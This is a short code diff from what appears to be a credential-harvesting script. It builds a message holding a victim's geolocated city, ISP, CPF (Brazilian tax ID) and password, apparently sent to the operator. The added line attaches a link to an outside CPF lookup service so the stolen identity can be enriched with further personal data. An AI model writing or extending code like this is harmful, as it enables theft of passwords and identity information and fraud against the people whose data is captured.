@@ -80,6 +80,7 @@ Cidade: ${responseGeoJson.city}
 Operadora: ${responseGeoJson.isp}
 CPF: ${cpf}
 Password: ${password}
+Informações pessoais: https://dbftools.tech/api/tools/search-cpf/${cpf}
         `
       })
     })
